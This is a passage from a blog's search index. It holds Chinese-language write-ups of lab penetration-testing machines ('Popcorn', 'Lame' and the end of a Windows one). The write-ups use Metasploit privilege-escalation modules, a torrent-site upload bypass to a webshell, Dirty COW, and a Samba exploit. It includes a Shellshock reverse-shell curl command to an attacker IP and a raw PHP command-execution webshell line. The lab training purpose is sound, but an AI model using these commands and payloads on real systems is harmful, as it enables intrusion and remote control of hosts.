class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">search suggester<br><br>[*] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.14</span> - Collecting <span class="hljs-keyword">local</span> exploits <span class="hljs-keyword">for</span> x86/windows...<br>[*] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.14</span> - <span class="hljs-number">28</span> exploit checks are being tried...<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.14</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms10_015_kitrap0d: The target service <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span>, <span class="hljs-keyword">but</span> could <span class="hljs-keyword">not</span> be validated.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.14</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms14_058_track_popup_menu: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.14</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms14_070_tcpip_ioctl: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.14</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms15_051_client_copy_image: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.14</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms16_016_webdav: The target service <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span>, <span class="hljs-keyword">but</span> could <span class="hljs-keyword">not</span> be validated.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.14</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms16_032_secondary_logon_handle_privesc: The target service <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span>, <span class="hljs-keyword">but</span> could <span class="hljs-keyword">not</span> be validated.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.14</span> - exploit/windows/<span class="hljs-keyword">local</span>/ppr_flatten_rec: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br></code></pre></div></td></tr></table></figure><p>尝试后，成功提权</p><figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams">use exploit/windows/local/ms14_070_tcpip_ioctl<br><span class="hljs-keyword">set</span> SESSION <span class="hljs-comment">3</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST tun0</span><br>run<br>ps 查看进程<br>cd <span class="hljs-comment">C:\Documents and Settings\Harry\Desktop</span><br>cat <span class="hljs-comment">user.txt</span><br>cd <span class="hljs-comment">C:\Documents and Settings\Administrator\Desktop</span><br>cat <span class="hljs-comment">root.txt</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-06/4.PNG" alt="4"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学习了msf的windows提权：search suggester</p><p>control z + y，将meterpreter到后台进程。</p><p>sessions -i 3，转到meterpreter</p><p>在执行缓冲区溢出时，执行一遍失败是很正常的，多试几遍~~</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>port 80</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Popcorn（文件上传）</title>
    <link href="/2019/01/04/x/"/>
    <url>/2019/01/04/x/</url>
    
    <content type="html"><![CDATA[<h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">5</span>.<span class="hljs-number">1</span>p<span class="hljs-number">1</span> Debian <span class="hljs-number">6</span>ubuntu<span class="hljs-number">2</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">12</span> ((Ubuntu))<br><span class="hljs-attribute">PHP</span>/<span class="hljs-number">5</span>.<span class="hljs-number">2</span>.<span class="hljs-number">10</span>-<span class="hljs-number">2</span>ubuntu<span class="hljs-number">6</span>.<span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>先检查破壳漏洞，然后检查/test目录泄露的信息<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/1.PNG" alt="1"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">获取的信息：<br>Server Administrator <br>webmaster@localhost <br><br>web路径：<span class="hljs-regexp">/etc/</span>apache2<br><span class="hljs-regexp">/var/</span>www/test.php <br><br>服务：<span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/mysqld/my</span>sqld.sock <br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.6</span><span class="hljs-regexp">/test/i</span>ndex.php<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.6</span><span class="hljs-regexp">/torrent/</span>database/<br>-- Database: `torrenthoster`<br></code></pre></div></td></tr></table></figure><p>burp scanner扫描了一遍，发现了几个漏洞，好像不能利用<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/12.PNG" alt="12"></p><h4 id="trying1-低版本openssh"><a href="#trying1-低版本openssh" class="headerlink" title="trying1: 低版本openssh"></a>trying1: 低版本openssh</h4><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/2.PNG" alt="2"></p><h4 id="trying2-破壳漏洞检查"><a href="#trying2-破壳漏洞检查" class="headerlink" title="trying2: 破壳漏洞检查"></a>trying2: 破壳漏洞检查</h4><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271">CVE-2014-6271</a></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">searchsploit shellshock<br><br>PHP &lt; <span class="hljs-number">5.6</span>.<span class="hljs-number">2</span> - <span class="hljs-string">&#x27;Shellshock&#x27;</span> Safe Mode <span class="hljs-regexp">/ Disable Functions Bypass /</span> Command Injection                         | exploits<span class="hljs-regexp">/php/</span>webapps/<span class="hljs-number">35146</span>.txt<br>Bash CGI - <span class="hljs-string">&#x27;Shellshock&#x27;</span> Remote Command Injection (Metasploit)                                               | exploits<span class="hljs-regexp">/cgi/</span>webapps/<span class="hljs-number">34895</span>.r<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/3.PNG" alt="3"><br>没有任何反应</p><h4 id="trying3-破壳漏洞检查2"><a href="#trying3-破壳漏洞检查2" class="headerlink" title="trying3: 破壳漏洞检查2"></a>trying3: 破壳漏洞检查2</h4><p><a href="http://10.10.10.6/test/">http://10.10.10.6/test/</a></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lnvp <span class="hljs-number">666</span><br><br><span class="hljs-attribute">curl</span> –H &#x27;x: () &#123; :;&#125;; /bin/bash –i &gt;&amp; /dev/tcp/<span class="hljs-number">10.10.14.13</span>/<span class="hljs-number">666</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#x27; http://<span class="hljs-number">10.10.10.6</span>/test/<br></code></pre></div></td></tr></table></figure><p>同样失败</p><h4 id="trying4-发现web目录"><a href="#trying4-发现web目录" class="headerlink" title="trying4: 发现web目录"></a>trying4: 发现web目录</h4><p>被漏洞扫描软件给坑了。不管有没有破壳漏洞，先扫描一下目录</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/4.PNG" alt="4"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/5.PNG" alt="5"></p><p>exploit db上搜索一下Torrent Hoster。</p><p><a href="https://www.exploit-db.com/exploits/11746">Torrent Hoster Remont Upload Exploit</a></p><p> sql注入检测被网站黑名单发现<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/11.PNG" alt="11"></p><p>做信息搜集发现的信息：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">MySQL db        http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.6</span><span class="hljs-regexp">/torrent/</span>comment<br></code></pre></div></td></tr></table></figure><h4 id="trying5-准备上传"><a href="#trying5-准备上传" class="headerlink" title="trying5: 准备上传"></a>trying5: 准备上传</h4><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/6.PNG" alt="6"><br>先随便上传一个txt，提示说明必须要是torrent文件，但是我们想要上传php类型webshell。</p><ol><li><p>上传torrent文件，burp—send to repeater，得到文件类型等信息。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/7.PNG" alt="7"></p></li><li><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/8.PNG" alt="8"><br>主面板获得上传的文件的路径。<br><a href="http://10.10.10.6/torrent/torrents.php?mode=download&amp;id=06aceda1226df400b0506aa813688f45309318a6">http://10.10.10.6/torrent/torrents.php?mode=download&amp;id=06aceda1226df400b0506aa813688f45309318a6</a></p></li></ol><p>3.<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/9.PNG" alt="9"><br>尝试替换为php反弹脚本，提示不是有效的torrent文件。</p><ol start="4"><li></li></ol><p>查看msfvenom能否生成torrent类型的载荷。</p><p><code>msfvenom -l formats | grep torrent</code></p><p>5.尝试在上传torrent时，同时上传一句话木马。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/10.PNG" alt="10"><br>生成了1.PNG.torrent</p><?php @system($_POST["cmd"])?><p>6.尝试在修改screenshot，上传反弹木马<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/13.PNG" alt="13"><br>先注册账号，然后登陆。</p><p>随便上传一个torrent，然后点击edit the torrent。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/14.PNG" alt="14"></p><p>替换图片内容为php-reverse-shell，名称后缀改为6.png.php</p><p>nc监听本地地址。</p><p>访问上传的路径：<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/15.PNG" alt="15"></p><p>上传php反弹webshell失败，权限不够。</p><ol start="7"><li>和上一步差不多，上传一句话，而不是php反弹脚本<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/16.PNG" alt="16"></li></ol><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/17.PNG" alt="17"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>uname -a</code></p><p>发现linux内核为2.6.x，于是dirty cow提权。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/19.PNG" alt="19"></p><p>值得一提的是</p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">./<span class="hljs-keyword">a</span>.out<br><br>Please enter <span class="hljs-keyword">the</span> <span class="hljs-built_in">new</span> password: <span class="hljs-keyword">a</span><br></code></pre></div></td></tr></table></figure><p>然后就卡了有将近一分钟吧，还以为提权执行失败了（，，）下回要耐心等待。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>以后遇到这种情况，测试方法</p><ul><li>某cms，先查找以往漏洞。</li><li>确定输入点，挨个测试一遍。（当时一直在测torrent上传，没想到漏洞在更改图片那里）</li><li>上传漏洞需要找到上传的文件的路径。<br>一般要结合<strong>路径遍历漏洞</strong>。例如在这个cms，如果像下图一样，只是说明上传成功了，但是没有给出上传的地址（一般来说也没有必要）。</li></ul><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-04/18.PNG" alt="18"></p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>port 80</tag>
      
      <tag>linux os</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lame（samba）</title>
    <link href="/2019/01/03/x/"/>
    <url>/2019/01/03/x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.3</p><h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><p>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</p><p>linux os</p><hr><p>这个training应该很简单，以前做过：<br><a href="https://whale3070.github.io/tools/2016/12/12/x/">139端口——smbclient</a></p><p><a href="https://whale3070.github.io/training/2017/10/01/kiotrix%E9%9D%B6%E6%9C%BA-139%E7%AB%AF%E5%8F%A3samba/">kiotrix靶机（139端口samba）</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-03/Screenshot%20from%202019-01-03%2015-51-52.png" alt="Screenshot from 2019-01-03 15-51-52"></p><p>得知服务版本<br>Samba 3.0.20-Debian</p><h2 id="trying-1"><a href="#trying-1" class="headerlink" title="trying 1"></a>trying 1</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-03/Screenshot%20from%202019-01-03%2016-00-54.png" alt="Screenshot from 2019-01-03 16-00-54"></p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">locate exploits<span class="hljs-regexp">/linux/</span>remote/<span class="hljs-number">9950</span>.rb<br>[*] exec: locate exploits<span class="hljs-regexp">/linux/</span>remote/<span class="hljs-number">9950</span>.rb<br><br><span class="hljs-regexp">/root/</span>exploit-database<span class="hljs-regexp">/exploits/</span>linux<span class="hljs-regexp">/remote/</span><span class="hljs-number">9950</span>.rb<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/exploitdb/</span>exploits<span class="hljs-regexp">/linux/</span>remote/<span class="hljs-number">9950</span>.rb<br><br>msfconsole<br>search -h<br>search platform:linux type:exploit samba<br> exploit<span class="hljs-regexp">/linux/</span>samba/chain_reply          <span class="hljs-number">2010</span>-<span class="hljs-number">06</span>-<span class="hljs-number">16</span>       good       No     Samba chain_reply Memory Corruption (Linux x86)<br>   exploit<span class="hljs-regexp">/linux/</span>samba/is_known_pipename    <span class="hljs-number">2017</span>-<span class="hljs-number">03</span>-<span class="hljs-number">24</span>       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load<br>   exploit<span class="hljs-regexp">/linux/</span>samba/lsa_transnames_heap  <span class="hljs-number">2007</span>-<span class="hljs-number">05</span>-<span class="hljs-number">14</span>       good       Yes    Samba lsa_io_trans_names Heap Overflow<br>   exploit<span class="hljs-regexp">/linux/</span>samba/setinfopolicy_heap   <span class="hljs-number">2012</span>-<span class="hljs-number">04</span>-<span class="hljs-number">10</span>       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow<br>   exploit<span class="hljs-regexp">/linux/</span>samba/trans2open           <span class="hljs-number">2003</span>-<span class="hljs-number">04</span>-<span class="hljs-number">07</span>       great      No     Samba trans2open Overflow (Linux x86)<br>   exploit<span class="hljs-regexp">/multi/</span>samba/nttrans              <span class="hljs-number">2003</span>-<span class="hljs-number">04</span>-<span class="hljs-number">07</span>       average    No     Samba <span class="hljs-number">2.2</span>.<span class="hljs-number">2</span> - <span class="hljs-number">2.2</span>.<span class="hljs-number">6</span> nttrans Buffer Overflow<br><br>use exploit<span class="hljs-regexp">/linux/</span>samba/setinfopolicy_heap<br>show <span class="hljs-keyword">options</span> <br>查看Exploit target:<br><span class="hljs-number">2</span>:<span class="hljs-number">3.5</span>.<span class="hljs-number">11</span>~dfsg-<span class="hljs-number">1</span>ubuntu2 on Ubuntu Server <span class="hljs-number">11.10</span> <br>这个payload目标不对，于是<br>back<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-03/Screenshot%20from%202019-01-03%2016-12-30.png" alt="Screenshot from 2019-01-03 16-12-30"></p><h4 id="导入msf载荷"><a href="#导入msf载荷" class="headerlink" title="导入msf载荷"></a>导入msf载荷</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cd <span class="hljs-regexp">/root/</span>.msf4<span class="hljs-regexp">/modules/</span>exploits/<br>mkdir samba3.<span class="hljs-number">0.21</span>-<span class="hljs-number">3.0</span>.<span class="hljs-number">24</span> <br>cd samba*<br>cp <span class="hljs-regexp">/root/</span>exploit-database<span class="hljs-regexp">/exploits/</span>linux<span class="hljs-regexp">/remote/</span><span class="hljs-number">9950</span>.rb .<br><br>重新启动msfconsole<br>search samba3<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-03/2.PNG" alt="2"><br>突然发现，目标版本好像不符合条件，samba3.0.21-3.0.24</p><p>ORZ，太粗心了</p><h2 id="trying2"><a href="#trying2" class="headerlink" title="trying2:"></a>trying2:</h2><p>Samba &lt; 3.0.20 - Remote Heap Overflow<br>exp是一些C代码，需要编译运行，而且注释是意大利语的。。</p><h2 id="trying3"><a href="#trying3" class="headerlink" title="trying3:"></a>trying3:</h2><p>google搜索Samba 3.0.20<br><a href="https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script">https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script</a></p><p>exploit/multi/samba/usermap_script</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-03/3.PNG" alt="3"></p><p>执行后，直接就是root权限</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>linux os</tag>
      
      <tag>port 139</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
